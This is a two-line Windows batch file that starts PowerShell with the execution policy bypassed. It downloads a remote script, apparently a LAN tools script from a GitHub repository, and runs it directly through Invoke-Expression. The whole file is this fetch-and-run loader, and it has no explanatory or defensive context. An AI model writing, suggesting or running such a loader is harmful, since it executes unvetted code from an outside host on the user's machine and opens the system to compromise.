@echo off
powershell.exe -Ep Bypass -C "$stage = 'y'; irm https://raw.githubusercontent.com/beigew0rm/Posh-LAN/main/Posh-LAN-Tools.ps1 | iex"
